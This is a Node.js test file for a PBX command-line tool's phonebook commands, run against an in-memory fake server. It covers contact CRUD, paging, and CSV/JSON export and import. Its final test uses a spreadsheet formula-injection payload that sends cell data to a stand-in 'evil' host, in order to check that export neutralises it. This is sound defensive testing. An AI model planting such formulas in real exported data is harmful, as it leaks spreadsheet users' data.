import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import {test} from 'node:test';
import {groups, parseCsv, toCsv} from '../src/commands/phonebook.mjs';
import {run, tempConfigDir} from './helpers.mjs';

const KEY = `wsk-v1-${'a'.repeat(93)}`;
const env = () => ({WILDIX_CONFIG_DIR: tempConfigDir(), WILDIX_PBX_API_KEY: KEY, WILDIX_PBX_HOST: 'demo'});

// A PBX with phonebooks and contacts in memory, as the live one answers: every value a string, {data: {...}} bodies,
// GET …/Contacts/{id} answering the whole list (as seen live), filter[id] filtering it.
function fakePbx() {
  const books = new Map([
    ['47', {id: '47', name: 'Customers', type: '2', owner_id: '0', contacts_cnt: '2'}],
    ['1', {id: '1', name: 'Personal', type: '1', owner_id: '5', contacts_cnt: '0'}],
  ]);
  const contacts = new Map([
    [
      '100',
      {
        id: '100',
        name: 'Ann, Sales',
        phone: '+39021234',
        email: 'ann@example.com',
        mobile: '',
        organization: 'ACME',
        phonebook_id: '47',
        hash: 'h1',
        last_update: '2026-11-07 10:00:00',
      },
    ],
    [
      '101',
      {
        id: '101',
        name: 'Bob "B"',
        phone: '',
        mobile: '+3933312',
        email: '',
        organization: '',
        phonebook_id: '47',
        hash: 'h2',
        last_update: '2026-11-07 10:00:00',
      },
    ],
  ]);
  let next = 200;
  const calls = [];
  const reply = (status, body) => new Response(JSON.stringify(body), {status});
  const result = (r) => reply(200, {type: 'result', result: r});
  const fetch = async (url, init) => {
    const u = new URL(url);
    const body = init.body ? JSON.parse(init.body) : undefined;
    calls.push({method: init.method, path: u.pathname, query: Object.fromEntries(u.searchParams), body});
    const m = u.pathname.match(/^\/api\/v1\/[Pp]honebooks\/(?:(\d+)\/)?(?:(Contacts)(?:\/(\d+))?\/?)?$/);
    if (!m) return reply(404, {type: 'error', reason: '404 Not Found'});
    const [, book, isContacts, contact] = m;
    if (book && !books.has(book)) return reply(404, {type: 'error', reason: 'Not found'});
    if (!isContacts) {
      if (init.method === 'GET' && !book) return result({total: books.size, records: [...books.values()]});
      if (init.method === 'GET') return result(books.get(book));
      if (init.method === 'POST') {
        const id = String(next++);
        books.set(id, {id, name: body.data.name, type: String(body.data.type), contacts_cnt: '0'});
        return result({id: Number(id)});
      }
      if (init.method === 'PUT') {
        Object.assign(books.get(book), body.data);
        return result({changed: 1});
      }
      if (init.method === 'DELETE') {
        books.delete(book);
        const gone = [...contacts.values()].filter((c) => c.phonebook_id === book);
        for (const c of gone) contacts.delete(c.id);
        return result({phonebooks: 1, contacts: gone.length});
      }
    }
    const inBook = [...contacts.values()].filter((c) => c.phonebook_id === book);
    if (init.method === 'GET') {
      const id = u.searchParams.get('filter[id]');
      const list = id ? inBook.filter((c) => c.id === id) : inBook;
      const start = Number(u.searchParams.get('start') ?? 0);
      const count = Number(u.searchParams.get('count') ?? 100);
      return result({total: list.length, records: list.slice(start, start + count)});
    }
    if (init.method === 'POST') {
      if (body.data.name === 'refused') return reply(400, {type: 'error', reason: 'Validation error'});
      const id = String(next++);
      contacts.set(id, {...body.data, id, phonebook_id: book});
      return result({id: Number(id)});
    }
    if (init.method === 'PUT') {
      Object.assign(contacts.get(contact), body.data);
      return result({changed: 1});
    }
    if (init.method === 'DELETE') return result({contacts: contacts.delete(contact) ? 1 : 0});
    return reply(405, {});
  };
  return {fetch, calls, books, contacts};
}

const registry = {groups};
const wx = (pbx, argv, options = {}) =>
  run([...argv, '--pbx', 'demo'], {env: env(), fetch: pbx.fetch, registry, ...options});

test('list and get by name; text with the type and the count of contacts', async () => {
  const pbx = fakePbx();
  const list = await wx(pbx, ['phonebook', 'list', '--search', 'Cust'], {output: 'text'});
  assert.equal(list.code, 0, list.stderr);
  assert.deepEqual(pbx.calls[0].query, {count: '1000', search: 'Cust'});
  assert.equal(list.stdout, '47  global    2 contacts  Customers\n1   personal  0 contacts  Personal\n');
  const got = await wx(pbx, ['phonebook', 'get', 'customers'], {output: 'text'});
  assert.equal(got.stdout, 'Customers (id 47, global, 2 contacts)\n');
  assert.equal(pbx.calls.at(-1).path, '/api/v1/Phonebooks/47/');
  assert.equal((await wx(pbx, ['phonebook', 'get', 'nope'])).code, 64);
});

test('create, update, delete (with --yes): {data: …} bodies', async () => {
  const pbx = fakePbx();
  const c = await wx(pbx, ['phonebook', 'create', 'Suppliers']);
  assert.equal(c.code, 0, c.stderr);
  assert.deepEqual(pbx.calls.at(-1), {
    method: 'POST',
    path: '/api/v1/Phonebooks/',
    query: {},
    body: {data: {name: 'Suppliers', type: 2}},
  });
  assert.deepEqual(JSON.parse(c.stdout), {id: 200, name: 'Suppliers'});
  await wx(pbx, ['phonebook', 'create', 'Mine', '--type', 'personal']);
  assert.equal(pbx.calls.at(-1).body.data.type, 1);
  assert.equal((await wx(pbx, ['phonebook', 'create', 'x', '--type', 'shared'])).code, 64);
  assert.equal((await wx(pbx, ['phonebook', 'update', 'Suppliers'])).code, 64);
  const u = await wx(pbx, ['phonebook', 'update', 'Suppliers', '--name', 'Vendors']);
  assert.equal(u.code, 0, u.stderr);
  assert.deepEqual(pbx.calls.at(-1), {
    method: 'PUT',
    path: '/api/v1/Phonebooks/200/',
    query: {},
    body: {data: {name: 'Vendors'}},
  });
  const before = pbx.calls.length;
  assert.equal((await wx(pbx, ['phonebook', 'delete', '47'])).code, 64);
  assert.equal(pbx.calls.length, before);
  const d = await wx(pbx, ['phonebook', 'delete', 'Customers', '--yes'], {output: 'text'});
  assert.equal(d.code, 0, d.stderr);
  assert.equal(d.stdout, 'Deleted the phonebook 47 and 2 contacts\n');
  assert.equal(pbx.calls.at(-1).method, 'DELETE');
  assert.equal(pbx.calls.at(-1).path, '/api/v1/Phonebooks/47/');
});

test('contacts: paging and search; text with the main number; contact by filter[id]', async () => {
  const pbx = fakePbx();
  const r = await wx(pbx, ['phonebook', 'contacts', '47', '--search', 'a', '--count', '1', '--offset', '1'], {
    output: 'text',
  });
  assert.equal(r.code, 0, r.stderr);
  assert.deepEqual(pbx.calls[0].query, {start: '1', count: '1', search: 'a', sort: 'name', dir: 'ASC'});
  assert.equal(r.stdout, '101  Bob "B"  +3933312\n1 of 2 contacts (--offset for more)\n');
  const one = await wx(pbx, ['phonebook', 'contact', '47', '100'], {output: 'text'});
  assert.equal(one.code, 0, one.stderr);
  assert.equal(pbx.calls.at(-1).path, '/api/v1/Phonebooks/47/Contacts/');
  assert.equal(pbx.calls.at(-1).query['filter[id]'], '100');
  assert.match(one.stdout, /^email {9}ann@example\.com$/m);
  assert.doesNotMatch(one.stdout, /hash|mobile/);
  assert.equal((await wx(pbx, ['phonebook', 'contact', '47', '999'])).code, 1);
  assert.equal((await wx(pbx, ['phonebook', 'contact', '47', '1/2'])).code, 64);
  assert.equal((await wx(pbx, ['phonebook', 'contacts', '47', '--count', '0'])).code, 64);
});

test('contact-add, contact-update (only the given fields), contact-delete with --yes', async () => {
  const pbx = fakePbx();
  assert.equal((await wx(pbx, ['phonebook', 'contact-add', '47', '--phone', '1'])).code, 64);
  const a = await wx(pbx, [
    'phonebook',
    'contact-add',
    'Customers',
    '--name',
    'Carl',
    '--phone',
    '+3902',
    '--email',
    'c@example.com',
    '--set',
    'city=Milan',
  ]);
  assert.equal(a.code, 0, a.stderr);
  assert.deepEqual(pbx.calls.at(-1), {
    method: 'POST',
    path: '/api/v1/Phonebooks/47/Contacts',
    query: {},
    body: {data: {name: 'Carl', phone: '+3902', email: 'c@example.com', city: 'Milan'}},
  });
  assert.equal((await wx(pbx, ['phonebook', 'contact-add', '47', '--name', 'x', '--set', 'hash=1'])).code, 64);
  assert.equal((await wx(pbx, ['phonebook', 'contact-update', '47', '100'])).code, 64);
  const u = await wx(pbx, ['phonebook', 'contact-update', '47', '100', '--email', '', '--mobile', '+3933']);
  assert.equal(u.code, 0, u.stderr);
  assert.deepEqual(pbx.calls.at(-1), {
    method: 'PUT',
    path: '/api/v1/phonebooks/47/Contacts/100',
    query: {},
    body: {data: {mobile: '+3933', email: ''}},
  });
  assert.equal(pbx.contacts.get('100').phone, '+39021234');
  const before = pbx.calls.length;
  assert.equal((await wx(pbx, ['phonebook', 'contact-delete', '47', '100'])).code, 64);
  assert.equal(pbx.calls.length, before);
  const d = await wx(pbx, ['phonebook', 'contact-delete', '47', '100', '101', '--yes'], {output: 'text'});
  assert.equal(d.stdout, 'Deleted 2 contacts of the phonebook 47\n');
  assert.deepEqual(
    pbx.calls.slice(-2).map((c) => `${c.method} ${c.path}`),
    ['DELETE /api/v1/Phonebooks/47/Contacts/100/', 'DELETE /api/v1/Phonebooks/47/Contacts/101/'],
  );
});

test('export: CSV and JSON without the fields the PBX keeps; a new file only', async () => {
  const pbx = fakePbx();
  const dir = tempConfigDir();
  const csv = await wx(pbx, ['phonebook', 'export', '47', '--format', 'csv'], {output: 'text'});
  assert.equal(csv.code, 0, csv.stderr);
  assert.equal(
    csv.stdout,
    'name,phone,email,organization,mobile\n"Ann, Sales",+39021234,ann@example.com,ACME,\n"Bob ""B""",,,,+3933312\n',
  );
  const file = path.join(dir, 'c.json');
  const r = await wx(pbx, ['phonebook', 'export', '47', '--to', file], {output: 'text'});
  assert.equal(r.code, 0, r.stderr);
  assert.deepEqual(JSON.parse(fs.readFileSync(file, 'utf8')), [
    {name: 'Ann, Sales', phone: '+39021234', email: 'ann@example.com', organization: 'ACME'},
    {name: 'Bob "B"', mobile: '+3933312'},
  ]);
  const csvFile = path.join(dir, 'c.csv');
  await wx(pbx, ['phonebook', 'export', '47', '--to', csvFile]);
  assert.match(fs.readFileSync(csvFile, 'utf8'), /^name,phone,email,organization,mobile\r\n/);
  const before = pbx.calls.length;
  assert.equal((await wx(pbx, ['phonebook', 'export', '47', '--to', file])).code, 64);
  assert.equal(pbx.calls.length, before, 'refused before anything is fetched');
  assert.equal((await wx(pbx, ['phonebook', 'export', '47', '--to', path.join(dir, '.x', 'c.csv')])).code, 64);
});

test('import: CSV or JSON (the export round trip), one POST per contact, refusals listed', async () => {
  const pbx = fakePbx();
  const dir = tempConfigDir();
  const file = path.join(dir, 'in.csv');
  fs.writeFileSync(file, '﻿name,phone,email,id\r\n"Dan, Jr",+39,"d@example.com",5\r\nrefused,1,,\r\n\r\n');
  const r = await wx(pbx, ['phonebook', 'import', 'Personal', '--from', file], {output: 'text'});
  assert.equal(r.code, 0, r.stderr);
  assert.deepEqual(pbx.calls.find((c) => c.method === 'POST').body, {
    data: {name: 'Dan, Jr', phone: '+39', email: 'd@example.com'},
  });
  assert.match(r.stdout, /^Added 1 contact to the phonebook 1\n {2}not added: 2 refused: HTTP 400/);
  const json = await wx(pbx, ['phonebook', 'import', '1', '--from', '-'], {
    stdin: JSON.stringify([{name: 'Eve', phone: 7}]),
  });
  assert.equal(json.code, 0, json.stderr);
  assert.deepEqual(pbx.calls.at(-1).body, {data: {name: 'Eve', phone: '7'}});
  assert.equal((await wx(pbx, ['phonebook', 'import', '1', '--from', '-'], {stdin: '[{"phone": "1"}]'})).code, 64);
  assert.equal((await wx(pbx, ['phonebook', 'import', '1', '--from', '-'], {stdin: 'name\nx'})).code, 64);
  assert.equal((await wx(pbx, ['phonebook', 'import', '1'])).code, 64);
  fs.writeFileSync(path.join(dir, 'my.secret.csv'), 'name\nx\n');
  assert.equal((await wx(pbx, ['phonebook', 'import', '1', '--from', path.join(dir, 'my.secret.csv')])).code, 64);
});

test('CSV: quotes, commas and line breaks survive a round trip', () => {
  const rows = [{name: 'A "x", b', note: 'line1\nline2'}, {name: 'plain'}];
  assert.deepEqual(parseCsv(toCsv(rows, ['name', 'note'])), [
    {name: 'A "x", b', note: 'line1\nline2'},
    {name: 'plain', note: ''},
  ]);
  assert.throws(() => parseCsv('name\n"open'), /not closed/);
});

test('CSV export guards cells a spreadsheet would run as a formula; import takes the guard off; phone numbers stay', async () => {
  const {toCsv, parseCsv} = await import('../src/commands/phonebook.mjs');
  const rows = [{name: '=HYPERLINK("http://evil/?"&A2,"x")', phone: '+39 02 1234-567', note: '@SUM(1)', other: '-2+3'}];
  const csv = toCsv(rows, ['name', 'phone', 'note', 'other']);
  assert.match(csv, /^"'=HYPERLINK/m);
  assert.match(csv, /,\+39 02 1234-567,/);
  assert.match(csv, /,'@SUM\(1\),/);
  assert.deepEqual(parseCsv(csv), rows);
});
